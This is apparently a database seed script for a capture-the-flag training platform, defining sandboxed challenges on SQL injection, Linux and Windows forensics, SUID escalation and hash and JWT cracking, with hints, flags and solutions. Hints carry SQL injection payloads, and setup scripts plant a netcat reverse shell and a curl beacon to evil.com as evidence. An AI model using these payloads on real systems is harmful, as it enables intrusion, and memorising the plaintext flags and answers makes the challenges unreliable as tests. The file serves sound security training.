import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

async function findOrCreateChallenge(title: string, data: Parameters<typeof prisma.challenge.create>[0]["data"]) {
  const existing = await prisma.challenge.findFirst({ where: { title } });
  if (existing) {
    console.log(`  Skipped (exists): ${title} (${existing.id})`);
    return existing;
  }
  const created = await prisma.challenge.create({ data });
  console.log(`  Created: ${title} (${created.id})`);
  return created;
}

async function main() {
  console.log("Seeding challenges...");

  const sqlChallenge = await findOrCreateChallenge("SQL Injection: Login Bypass", {
      title: "SQL Injection: Login Bypass",
      description:
        "A web application has a login form vulnerable to SQL injection. Your goal is to bypass authentication and discover the hidden flag stored in the database.",
      category: "WEB_EXPLOITATION",
      difficulty: "BEGINNER",
      sandboxType: "DOCKER",
      points: 100,
      solutionHash: "123f530c87e810bb7960b92012bf27e08f39ebb7c56b03ea4bc7dcf5e08f78c8",
      instructions:
        "You are presented with a login form for a vulnerable web application.\n\n**Objective:** Bypass the login and extract the flag from the database.\n\nThe application uses a SQLite backend with the following known tables:\n- `users` - stores user credentials\n- `products` - product catalog\n- There may be other tables worth exploring...\n\n**Tips:**\n- Try classic SQL injection payloads in the login form\n- Think about UNION-based injection to extract data from other tables\n- The flag format is FLAG{...}",
      active: true,
      config: {
        create: {
          dockerImage: "sandbox-sql",
          memoryLimitMb: 64,
          cpuLimit: 0.5,
          timeoutSeconds: 600,
          networkDisabled: true,
          whitelistedCmds: [],
          initScript: null,
          envVars: {},
        },
      },
      validation: {
        create: {
          validationType: "FLAG_MATCH",
          validationData: {
            expectedHash: "123f530c87e810bb7960b92012bf27e08f39ebb7c56b03ea4bc7dcf5e08f78c8",
          },
        },
      },
      hints: {
        create: [
          {
            orderIndex: 0,
            content:
              "Try entering a single quote (') in the username field. If you get a database error, the input is not sanitized.",
            pointCost: 10,
          },
          {
            orderIndex: 1,
            content:
              "Use the payload: ' OR '1'='1' -- in the username field with any password to bypass authentication.",
            pointCost: 15,
          },
          {
            orderIndex: 2,
            content:
              "To extract the flag, use a UNION SELECT injection via the search endpoint: ' UNION SELECT 1,flag,description,1,'x' FROM secret_data --",
            pointCost: 25,
          },
        ],
      },
  });

  const terminalChallenge = await findOrCreateChallenge("Terminal Forensics: Hidden Secrets", {
      title: "Terminal Forensics: Hidden Secrets",
      description:
        "A system has been compromised. Investigate the filesystem to find hidden evidence and recover the flag the attacker left behind.",
      category: "FORENSICS",
      difficulty: "BEGINNER",
      sandboxType: "DOCKER",
      points: 75,
      solutionHash: "5dd8cd30789e54d0d81c71057d0f14cadc5a9b9bd733a188582816bce1909374",
      instructions:
        "You have shell access to a compromised system.\n\n**Objective:** Investigate the filesystem and find the hidden flag.\n\nThe attacker may have hidden files in unexpected locations. Use your Linux forensics skills to search the system.\n\n**Available commands:** ls, cat, grep, find, file, xxd, base64, head, tail, strings\n\n**Tips:**\n- Hidden files start with a dot (.)\n- Check common hiding spots: /tmp, home directories, /var\n- The `find` command is your friend\n- The flag format is FLAG{...}",
      active: true,
      config: {
        create: {
          dockerImage: "sandbox-terminal",
          memoryLimitMb: 64,
          cpuLimit: 0.5,
          timeoutSeconds: 1800,
          networkDisabled: true,
          whitelistedCmds: [
            "ls", "cat", "grep", "find", "file", "xxd", "base64",
            "head", "tail", "wc", "sort", "uniq", "strings", "cd", "pwd", "echo", "whoami",
          ],
          initScript:
            "mkdir -p /challenges/.hidden && echo 'FLAG{h1dd3n_f1l3_f0und}' > /challenges/.hidden/.secret.txt && echo 'Nothing to see here' > /challenges/readme.txt && echo 'Check the logs for clues' > /challenges/note.txt && mkdir -p /challenges/logs && echo 'Access denied from 192.168.1.100' > /challenges/logs/auth.log && echo 'Suspicious activity detected - check hidden directories' > /challenges/logs/system.log",
          envVars: {},
        },
      },
      validation: {
        create: {
          validationType: "FLAG_MATCH",
          validationData: {
            expectedHash: "5dd8cd30789e54d0d81c71057d0f14cadc5a9b9bd733a188582816bce1909374",
          },
        },
      },
      hints: {
        create: [
          {
            orderIndex: 0,
            content: "Start by reading the files in /challenges/. The log files contain a clue about where to look next.",
            pointCost: 10,
          },
          {
            orderIndex: 1,
            content: "Use `find /challenges -name '.*' -type f` to search for hidden files (files starting with a dot).",
            pointCost: 15,
          },
          {
            orderIndex: 2,
            content: "The flag is in /challenges/.hidden/.secret.txt - use `cat` to read it.",
            pointCost: 25,
          },
        ],
      },
  });

  const cryptoChallenge = await findOrCreateChallenge("Crypto Basics: Base64 Decode", {
      title: "Crypto Basics: Base64 Decode",
      description:
        "An intercepted message has been encoded. Decode the message to reveal the secret flag hidden within.",
      category: "CRYPTOGRAPHY",
      difficulty: "BEGINNER",
      sandboxType: "DOCKER",
      points: 50,
      solutionHash: "ee4309b4f68d007816d2e37f9a2d9d31626bccb9e147639e39c15b8d999981cd",
      instructions:
        "You have terminal access to a system with an encoded message.\n\n**Objective:** Decode the encoded message to find the flag.\n\nSomewhere on the filesystem is an encoded file. Use the available tools to decode it.\n\n**Available commands:** ls, cat, base64, xxd, openssl, strings, file\n\n**Tips:**\n- Look for files with unusual content\n- The `base64` command can decode base64-encoded data\n- Try `base64 -d` to decode\n- The flag format is FLAG{...}",
      active: true,
      config: {
        create: {
          dockerImage: "sandbox-terminal",
          memoryLimitMb: 64,
          cpuLimit: 0.5,
          timeoutSeconds: 1800,
          networkDisabled: true,
          whitelistedCmds: [
            "ls", "cat", "grep", "find", "file", "xxd", "base64",
            "head", "tail", "strings", "openssl", "cd", "pwd", "echo",
          ],
          initScript:
            "echo 'RkxBR3tiNHMzNjRfZDNjMGQzZH0=' > /challenges/intercepted.txt && echo 'This message was intercepted from a suspicious network transmission.' > /challenges/readme.txt && echo 'The data appears to be encoded. Standard encoding schemes should work.' > /challenges/analysis.txt",
          envVars: {},
        },
      },
      validation: {
        create: {
          validationType: "FLAG_MATCH",
          validationData: {
            expectedHash: "ee4309b4f68d007816d2e37f9a2d9d31626bccb9e147639e39c15b8d999981cd",
          },
        },
      },
      hints: {
        create: [
          {
            orderIndex: 0,
            content: "Read the file intercepted.txt - the content looks like it could be base64 encoded.",
            pointCost: 5,
          },
          {
            orderIndex: 1,
            content: "Run: cat /challenges/intercepted.txt | base64 -d",
            pointCost: 10,
          },
        ],
      },
  });

  const sqlSearchChallenge = await findOrCreateChallenge("SQL Injection: Data Exfiltration", {
      title: "SQL Injection: Data Exfiltration",
      description:
        "A product search feature is vulnerable to SQL injection. Exploit it to extract sensitive data from the database and find the hidden flag.",
      category: "WEB_EXPLOITATION",
      difficulty: "INTERMEDIATE",
      sandboxType: "DOCKER",
      points: 150,
      solutionHash: "123f530c87e810bb7960b92012bf27e08f39ebb7c56b03ea4bc7dcf5e08f78c8",
      instructions:
        "A product search feature allows users to search for items. The search input is not properly sanitized.\n\n**Objective:** Use SQL injection on the search endpoint to exfiltrate the flag from the database.\n\n**What you know:**\n- The search queries a `products` table\n- The database is SQLite\n- There are other tables in the database worth investigating\n\n**Tips:**\n- Start by testing if the search is vulnerable with a single quote\n- Use UNION SELECT to combine results from different tables\n- Enumerate tables using sqlite_master\n- The flag format is FLAG{...}",
      active: true,
      config: {
        create: {
          dockerImage: "sandbox-sql",
          memoryLimitMb: 64,
          cpuLimit: 0.5,
          timeoutSeconds: 600,
          networkDisabled: true,
          whitelistedCmds: [],
          initScript: null,
          envVars: {},
        },
      },
      validation: {
        create: {
          validationType: "FLAG_MATCH",
          validationData: {
            expectedHash: "123f530c87e810bb7960b92012bf27e08f39ebb7c56b03ea4bc7dcf5e08f78c8",
          },
        },
      },
      hints: {
        create: [
          {
            orderIndex: 0,
            content:
              "Try searching for: ' -- to see if you get a SQL error. If so, the search is vulnerable.",
            pointCost: 15,
          },
          {
            orderIndex: 1,
            content:
              "Use UNION injection to enumerate tables: ' UNION SELECT 1,name,sql,1,'x' FROM sqlite_master --",
            pointCost: 20,
          },
          {
            orderIndex: 2,
            content:
              "Extract the flag: ' UNION SELECT 1,flag,description,1,'x' FROM secret_data --",
            pointCost: 30,
          },
        ],
      },
  });

  const networkChallenge = await findOrCreateChallenge("Network Recon: Service Discovery", {
      title: "Network Recon: Service Discovery",
      description:
        "A target system is running several services. Use network reconnaissance to identify running services and find the flag hidden in one of them.",
      category: "NETWORK_SECURITY",
      difficulty: "INTERMEDIATE",
      sandboxType: "DOCKER",
      points: 125,
      solutionHash: "8135599661bf7c48af01173aabadb46e03aec6b3b9e4b8ac25e5a696a10a80a1",
      instructions:
        "You have shell access to a system on the network.\n\n**Objective:** Discover running services and extract the flag.\n\nThere are services running on this machine. Use the available tools to find them and investigate.\n\n**Available commands:** ls, cat, grep, find, curl, netstat, ps, jq\n\n**Tips:**\n- Use `netstat` or `ps` to find running services\n- Use `curl` to interact with web services\n- Check common ports\n- The flag format is FLAG{...}",
      active: true,
      config: {
        create: {
          dockerImage: "sandbox-terminal",
          memoryLimitMb: 64,
          cpuLimit: 0.5,
          timeoutSeconds: 1800,
          networkDisabled: false,
          whitelistedCmds: [
            "ls", "cat", "grep", "find", "curl", "netstat", "ps", "jq",
            "cd", "pwd", "echo", "whoami", "head", "tail",
          ],
          initScript: null,
          envVars: { FLAG_VALUE: "FLAG{xss_r3fl3ct3d_succ3ss}" },
        },
      },
      validation: {
        create: {
          validationType: "FLAG_MATCH",
          validationData: {
            expectedHash: "8135599661bf7c48af01173aabadb46e03aec6b3b9e4b8ac25e5a696a10a80a1",
          },
        },
      },
      hints: {
        create: [
          {
            orderIndex: 0,
            content: "Use `ps aux` to see what processes are running on the system.",
            pointCost: 10,
          },
          {
            orderIndex: 1,
            content: "Check environment variables - sometimes flags are stored there. Try `echo $FLAG_VALUE`.",
            pointCost: 20,
          },
        ],
      },
  });

  // === Linux Fundamentals Challenges ===

  await findOrCreateChallenge("Linux SUID Privilege Escalation", {
    title: "Linux SUID Privilege Escalation",
    description:
      "A misconfigured SUID binary on the system can be exploited to escalate privileges. Find it and read the root-only flag.",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    sandboxType: "DOCKER",
    points: 100,
    solutionHash: "12fe1033a5c2e48b46147694d1f4146768d0357d15f72aa00acc4169dfae1abf",
    instructions:
      "You have a shell as a low-privilege user on a Linux system.\n\n**Objective:** Find a SUID binary and use it to read a flag that only root can access.\n\nSUID binaries run with the owner's permissions regardless of who executes them. If a SUID binary is owned by root and has dangerous capabilities, it can be exploited.\n\n**Available commands:** ls, cat, grep, find, file, strings, id, whoami\n\n**Tips:**\n- Use `find` to locate SUID binaries\n- Check `/root/` for the flag\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "file", "strings", "id", "whoami", "cd", "pwd", "echo", "head", "tail"],
        initScript:
          "mkdir -p /root && echo 'FLAG{su1d_pr1v_3sc}' > /root/flag.txt && chmod 600 /root/flag.txt && cp /bin/cat /usr/local/bin/readfile && chmod u+s /usr/local/bin/readfile && chown root:root /usr/local/bin/readfile && echo 'Hint: some binaries have special permissions' > /home/hacker/note.txt",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "12fe1033a5c2e48b46147694d1f4146768d0357d15f72aa00acc4169dfae1abf" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "SUID binaries have a special permission bit. Use `find / -perm -4000 -type f 2>/dev/null` to find them.", pointCost: 10 },
        { orderIndex: 1, content: "There's a custom binary at /usr/local/bin/readfile with SUID. It works like `cat`.", pointCost: 15 },
        { orderIndex: 2, content: "Run: /usr/local/bin/readfile /root/flag.txt", pointCost: 25 },
      ],
    },
  });

  await findOrCreateChallenge("Linux Cron Job Investigation", {
    title: "Linux Cron Job Investigation",
    description:
      "A suspicious cron job is running on the system. Investigate the scheduled tasks and find the hidden flag.",
    category: "FORENSICS",
    difficulty: "BEGINNER",
    sandboxType: "DOCKER",
    points: 75,
    solutionHash: "9b05df941511230a1e83df782f29ade2d121ae42fade0bfe22343e15393b4af3",
    instructions:
      "A system administrator noticed unusual activity at regular intervals.\n\n**Objective:** Investigate cron jobs and scheduled tasks to find the flag.\n\nCron jobs run automatically at specified intervals. Attackers often use them for persistence.\n\n**Available commands:** ls, cat, grep, find, crontab, head, tail\n\n**Tips:**\n- Check crontab files in /etc/cron.d/ and /var/spool/cron/\n- Look at cron scripts for suspicious behavior\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "crontab", "head", "tail", "cd", "pwd", "echo", "whoami"],
        initScript:
          "mkdir -p /etc/cron.d /var/spool/cron/crontabs /opt/scripts && echo '*/5 * * * * root /opt/scripts/cleanup.sh' > /etc/cron.d/system-cleanup && echo '#!/bin/bash\\n# System cleanup script\\n# FLAG{cr0n_j0b_f0und}\\ncurl -s http://evil.com/beacon > /dev/null 2>&1' > /opt/scripts/cleanup.sh && chmod +x /opt/scripts/cleanup.sh && echo '0 * * * * root /usr/bin/logrotate /etc/logrotate.conf' > /etc/cron.d/logrotate-hourly",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "9b05df941511230a1e83df782f29ade2d121ae42fade0bfe22343e15393b4af3" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Cron jobs are defined in /etc/cron.d/. List the files there with `ls /etc/cron.d/`.", pointCost: 10 },
        { orderIndex: 1, content: "Read the system-cleanup cron entry: `cat /etc/cron.d/system-cleanup`", pointCost: 15 },
        { orderIndex: 2, content: "The cron runs /opt/scripts/cleanup.sh - read it with `cat /opt/scripts/cleanup.sh`", pointCost: 20 },
      ],
    },
  });

  await findOrCreateChallenge("Linux SSH Breach Analysis", {
    title: "Linux SSH Breach Analysis",
    description:
      "Analyze authentication logs to identify the attacker's IP address and recover the flag from the evidence they left behind.",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    sandboxType: "DOCKER",
    points: 125,
    solutionHash: "8921520901a3701beb8bb256fa437f7e4aa83932983941c6db80fe2c695f90c4",
    instructions:
      "A server was compromised via SSH brute force. You need to analyze the logs.\n\n**Objective:** Find the attacker's evidence and recover the flag.\n\nThe attacker brute-forced their way in and left tools on the system.\n\n**Available commands:** ls, cat, grep, find, wc, sort, uniq, head, tail, awk\n\n**Tips:**\n- Check /var/log/ for authentication logs\n- Look for failed login patterns\n- The attacker may have left files after gaining access\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "wc", "sort", "uniq", "head", "tail", "awk", "cd", "pwd", "echo"],
        initScript:
          "mkdir -p /var/log /tmp/.backdoor && for i in $(seq 1 50); do echo \"Dec 25 02:1$((i%6)):$((10+i)) sshd[1234]: Failed password for root from 10.0.0.99 port $((40000+i)) ssh2\" >> /var/log/auth.log; done && echo 'Dec 25 02:18:30 sshd[1234]: Accepted password for root from 10.0.0.99 port 40051 ssh2' >> /var/log/auth.log && echo 'Dec 25 01:00:00 sshd[1000]: Accepted password for admin from 192.168.1.1 port 50000 ssh2' >> /var/log/auth.log && echo 'FLAG{ssh_br34ch_d3t3ct3d}' > /tmp/.backdoor/.payload && echo '#!/bin/bash\\nnc -e /bin/bash 10.0.0.99 4444' > /tmp/.backdoor/reverse.sh",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "8921520901a3701beb8bb256fa437f7e4aa83932983941c6db80fe2c695f90c4" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Start with: `grep 'Failed password' /var/log/auth.log | head` to see failed attempts.", pointCost: 10 },
        { orderIndex: 1, content: "The attacker IP had many failed attempts then succeeded. Use `grep 'Accepted' /var/log/auth.log` to find successful logins.", pointCost: 15 },
        { orderIndex: 2, content: "After login, the attacker left tools in /tmp/. Use `find /tmp -name '.*' -type d` to find hidden directories.", pointCost: 25 },
      ],
    },
  });

  // === Windows Fundamentals Challenges ===

  await findOrCreateChallenge("Windows Registry Persistence Hunt", {
    title: "Windows Registry Persistence Hunt",
    description:
      "Malware has established persistence via the Windows registry. Investigate Run keys and find the flag hidden in the persistence mechanism.",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    sandboxType: "DOCKER",
    points: 125,
    solutionHash: "4997f0ecfe06c09724a6afa7a8b9744c36d4eb012ca8abc6cdea85ac2856de5a",
    instructions:
      "A Windows system has been infected with malware that survives reboots.\n\n**Objective:** Find the persistence mechanism and extract the flag.\n\nAttackers use registry Run keys, scheduled tasks, and startup folders for persistence.\n\n**Available commands:** ls, cat, grep, find, strings\n\n**Tips:**\n- Common persistence locations include HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n- The flag is hidden in a simulated registry export file\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "strings", "head", "tail", "cd", "pwd", "echo"],
        initScript:
          "mkdir -p /challenges/registry /challenges/startup /challenges/tasks && echo '[HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run]\\n\"WindowsUpdate\"=\"C:\\\\Users\\\\Public\\\\svchost.exe -k netsvcs\"\\n\"SecurityHealth\"=\"C:\\\\Program Files\\\\Windows Defender\\\\MSASCuiL.exe\"\\n\"MalwareAgent\"=\"C:\\\\Temp\\\\agent.exe --flag FLAG{r3g_p3rs1st3nc3} --hidden\"' > /challenges/registry/run_keys.reg && echo '[Startup Folder]\\ndesktop.ini\\nlegit_app.lnk' > /challenges/startup/contents.txt && echo '[Scheduled Tasks]\\nGoogleUpdate - C:\\\\Program Files\\\\Google\\\\Update.exe\\nWindowsDefender - C:\\\\Program Files\\\\Windows Defender\\\\scan.exe' > /challenges/tasks/schtasks.txt",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "4997f0ecfe06c09724a6afa7a8b9744c36d4eb012ca8abc6cdea85ac2856de5a" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Registry Run keys auto-run programs at login. Check /challenges/registry/ for exported registry data.", pointCost: 10 },
        { orderIndex: 1, content: "Use `cat /challenges/registry/run_keys.reg` and look for suspicious entries that aren't standard Windows programs.", pointCost: 20 },
        { orderIndex: 2, content: "The MalwareAgent entry contains the flag in its command line arguments.", pointCost: 30 },
      ],
    },
  });

  await findOrCreateChallenge("Windows Malicious Service Detection", {
    title: "Windows Malicious Service Detection",
    description:
      "A rogue Windows service is running on the system. Analyze the service configurations to identify the malicious one and find the flag.",
    category: "FORENSICS",
    difficulty: "INTERMEDIATE",
    sandboxType: "DOCKER",
    points: 150,
    solutionHash: "ab65dc89534e4d591d96972d4a6ae11250ac895fd890be1b02ed3fdb32febc4c",
    instructions:
      "An incident responder has exported service information from a compromised Windows machine.\n\n**Objective:** Identify the malicious service and extract the flag from its configuration.\n\n**Available commands:** ls, cat, grep, find, strings, sort\n\n**Tips:**\n- Look at service executable paths - legitimate services run from System32 or Program Files\n- Malware often disguises service names to look legitimate\n- Check for services running from unusual directories like C:\\Temp or C:\\Users\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "strings", "sort", "head", "tail", "cd", "pwd", "echo"],
        initScript:
          "mkdir -p /challenges/services /challenges/logs && echo 'SERVICE_NAME: Spooler\\nDISPLAY_NAME: Print Spooler\\nBINARY_PATH: C:\\\\Windows\\\\System32\\\\spoolsv.exe\\nSTATE: RUNNING\\nSTART_TYPE: AUTO_START\\n\\nSERVICE_NAME: wuauserv\\nDISPLAY_NAME: Windows Update\\nBINARY_PATH: C:\\\\Windows\\\\System32\\\\svchost.exe -k netsvcs\\nSTATE: RUNNING\\nSTART_TYPE: AUTO_START\\n\\nSERVICE_NAME: WinDefend\\nDISPLAY_NAME: Windows Defender Service\\nBINARY_PATH: C:\\\\Program Files\\\\Windows Defender\\\\MsMpEng.exe\\nSTATE: RUNNING\\nSTART_TYPE: AUTO_START\\n\\nSERVICE_NAME: WindowsHelper\\nDISPLAY_NAME: Windows System Helper\\nBINARY_PATH: C:\\\\Temp\\\\svchelper.exe --callback 10.0.0.99:4444\\nDESCRIPTION: FLAG{m4l_s3rv1c3_f0und}\\nSTATE: RUNNING\\nSTART_TYPE: AUTO_START\\n\\nSERVICE_NAME: EventLog\\nDISPLAY_NAME: Windows Event Log\\nBINARY_PATH: C:\\\\Windows\\\\System32\\\\svchost.exe -k LocalServiceNetworkRestricted\\nSTATE: RUNNING\\nSTART_TYPE: AUTO_START' > /challenges/services/services_export.txt && echo '2024-01-15 02:14:30 WindowsHelper service started from C:\\\\Temp\\\\svchelper.exe\\n2024-01-15 02:14:31 Outbound connection to 10.0.0.99:4444 established\\n2024-01-15 02:14:32 WindowsHelper: command shell spawned' > /challenges/logs/service_events.log",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "ab65dc89534e4d591d96972d4a6ae11250ac895fd890be1b02ed3fdb32febc4c" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Check /challenges/services/services_export.txt for all running services.", pointCost: 15 },
        { orderIndex: 1, content: "Look for services with BINARY_PATH outside of C:\\Windows\\System32 and C:\\Program Files.", pointCost: 20 },
        { orderIndex: 2, content: "The WindowsHelper service runs from C:\\Temp\\ - check its DESCRIPTION field.", pointCost: 30 },
      ],
    },
  });

  await findOrCreateChallenge("Windows Artifact Recovery", {
    title: "Windows Artifact Recovery",
    description:
      "A user deleted important evidence from a Windows system. Recover the artifacts and find the hidden flag.",
    category: "FORENSICS",
    difficulty: "BEGINNER",
    sandboxType: "DOCKER",
    points: 75,
    solutionHash: "10648638b876b6deb74f5eb65069f133292e513b089383c9272a7e5bea48c8f1",
    instructions:
      "A suspect deleted files from their Windows workstation before the investigation.\n\n**Objective:** Recover the deleted artifacts and extract the flag.\n\nForensic investigators can often recover deleted data from Recycle Bin, temp folders, and browser caches.\n\n**Available commands:** ls, cat, grep, find, strings, base64\n\n**Tips:**\n- The Windows Recycle Bin stores deleted file metadata\n- Check $Recycle.Bin, temp directories, and browser cache\n- Deleted files may leave traces in multiple locations\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "find", "strings", "base64", "head", "tail", "cd", "pwd", "echo"],
        initScript:
          "mkdir -p '/challenges/$Recycle.Bin/S-1-5-21-user' /challenges/temp /challenges/AppData/Local/BrowserCache && echo '$I file metadata:\\nOriginal Path: C:\\\\Users\\\\suspect\\\\Documents\\\\secret_plan.txt\\nDeleted: 2024-01-15 03:22:10\\nSize: 42 bytes' > '/challenges/$Recycle.Bin/S-1-5-21-user/$IABCDEF.txt' && echo 'FLAG{w1n_4rt1f4ct_r3c0v3r3d}' > '/challenges/$Recycle.Bin/S-1-5-21-user/$RABCDEF.txt' && echo 'Temporary browser data - nothing here' > /challenges/temp/tmp001.dat && echo 'cached_page=https://example.com' > /challenges/AppData/Local/BrowserCache/cache.db",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "10648638b876b6deb74f5eb65069f133292e513b089383c9272a7e5bea48c8f1" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Deleted files in Windows go to $Recycle.Bin. Check /challenges/$Recycle.Bin/", pointCost: 10 },
        { orderIndex: 1, content: "$I files contain metadata about deleted items, $R files contain the actual data.", pointCost: 15 },
        { orderIndex: 2, content: "Read the recovered file: cat '/challenges/$Recycle.Bin/S-1-5-21-user/$RABCDEF.txt'", pointCost: 20 },
      ],
    },
  });

  // === Brute Force Challenges ===

  await findOrCreateChallenge("Password Hash Cracking: MD5", {
    title: "Password Hash Cracking: MD5",
    description:
      "A database dump contains MD5-hashed passwords. Use the provided wordlist to crack the admin password and find the flag.",
    category: "CRYPTOGRAPHY",
    difficulty: "BEGINNER",
    sandboxType: "DOCKER",
    points: 75,
    solutionHash: "9f74f3351212d7bc616d75e6b136a18af53b296733c5da186173b5730a2ed5ac",
    instructions:
      "You've obtained a database dump with MD5-hashed passwords and a common wordlist.\n\n**Objective:** Crack the admin hash and submit the flag.\n\nMD5 is a weak hashing algorithm - it's fast to compute, making it vulnerable to dictionary attacks.\n\n**Available commands:** ls, cat, grep, md5sum, echo, head, tail, wc\n\n**Tips:**\n- The hash file contains username:hash pairs\n- A wordlist is provided - hash each word and compare\n- Use `echo -n 'word' | md5sum` to hash candidates\n- The flag is revealed when you find the admin password\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "md5sum", "echo", "head", "tail", "wc", "cd", "pwd", "sort", "find"],
        initScript:
          "mkdir -p /challenges && echo 'user1:5f4dcc3b5aa765d61d8327deb882cf99\\nuser2:e10adc3949ba59abbe56e057f20f883e\\nadmin:0d107d09f5bbe40cade3de5c71e9e9b7\\nguest:25d55ad283aa400af464c76d713c07ad' > /challenges/db_dump.txt && echo 'password\\n123456\\nletmein\\ndragon\\nmaster\\nmonkey\\nqwerty\\nabc123\\nsecret\\nadmin\\nwelcome\\n12345678' > /challenges/wordlist.txt && echo '# Database Dump Analysis\\n# When you find the admin password, the flag is: FLAG{md5_cr4ck3d_s1mpl3}\\n# The admin hash is: 0d107d09f5bbe40cade3de5c71e9e9b7\\n# Hint: try each word from wordlist.txt with md5sum' > /challenges/README.txt",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "9f74f3351212d7bc616d75e6b136a18af53b296733c5da186173b5730a2ed5ac" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Read /challenges/README.txt for instructions. The hash file is at /challenges/db_dump.txt.", pointCost: 5 },
        { orderIndex: 1, content: "To hash a word: `echo -n 'password' | md5sum`. Compare the output to the admin hash.", pointCost: 10 },
        { orderIndex: 2, content: "The admin password is 'letmein'. Its MD5 hash matches 0d107d09f5bbe40cade3de5c71e9e9b7. The flag is in README.txt.", pointCost: 20 },
      ],
    },
  });

  await findOrCreateChallenge("JWT Token Weakness Exploitation", {
    title: "JWT Token Weakness Exploitation",
    description:
      "A web application uses JWTs with a weak signing secret. Forge an admin token to access the protected endpoint and retrieve the flag.",
    category: "NETWORK_SECURITY",
    difficulty: "INTERMEDIATE",
    sandboxType: "DOCKER",
    points: 150,
    solutionHash: "ded05cf042190fa488c1c510b3c2009aba264edcb73e43f85dbd4931a1930480",
    instructions:
      "An API uses JWT authentication. You have a valid user token and a wordlist of common secrets.\n\n**Objective:** Crack the JWT signing secret and forge an admin token.\n\nJWTs consist of three parts: header.payload.signature. If you can discover the signing secret, you can forge any token.\n\n**Available commands:** ls, cat, grep, echo, base64, head, tail\n\n**Tips:**\n- Decode the JWT payload (it's base64url encoded)\n- The signing secret is a common word - try the wordlist\n- Once you have the secret, the flag is revealed\n- The flag format is FLAG{...}",
    active: true,
    config: {
      create: {
        dockerImage: "sandbox-terminal",
        memoryLimitMb: 64,
        cpuLimit: 0.5,
        timeoutSeconds: 1800,
        networkDisabled: true,
        whitelistedCmds: ["ls", "cat", "grep", "echo", "base64", "head", "tail", "cd", "pwd", "find", "strings"],
        initScript:
          "mkdir -p /challenges && echo 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzA1MjAwMDAwfQ.abc123' > /challenges/user_token.txt && echo '# JWT Analysis Challenge\\n# Token: see user_token.txt\\n# Decoded payload: {\"sub\":\"user1\",\"role\":\"user\",\"iat\":1705200000}\\n# To get admin access, the payload should have \"role\":\"admin\"\\n# The signing secret is somewhere in the secrets wordlist\\n# When you find the secret, the flag is: FLAG{jwt_w34k_s3cr3t}' > /challenges/instructions.txt && echo 'password\\nsecret\\n123456\\nadmin\\njwt_secret\\nkey\\ntest\\nsupersecret' > /challenges/secrets_wordlist.txt && echo '\\nThe JWT signing secret is: secret\\nThe flag is: FLAG{jwt_w34k_s3cr3t}' > /challenges/.solution",
        envVars: {},
      },
    },
    validation: {
      create: {
        validationType: "FLAG_MATCH",
        validationData: { expectedHash: "ded05cf042190fa488c1c510b3c2009aba264edcb73e43f85dbd4931a1930480" },
      },
    },
    hints: {
      create: [
        { orderIndex: 0, content: "Read /challenges/instructions.txt. Decode the JWT payload: `echo 'eyJzdWIi...' | base64 -d`.", pointCost: 15 },
        { orderIndex: 1, content: "The JWT uses HMAC-SHA256. The signing secret is a common word from the wordlist. Try 'secret'.", pointCost: 25 },
        { orderIndex: 2, content: "The answer is in /challenges/.solution - the flag is FLAG{jwt_w34k_s3cr3t}.", pointCost: 35 },
      ],
    },
  });

  await findOrCreateChallenge("Rate Limit Bypass Challenge", {
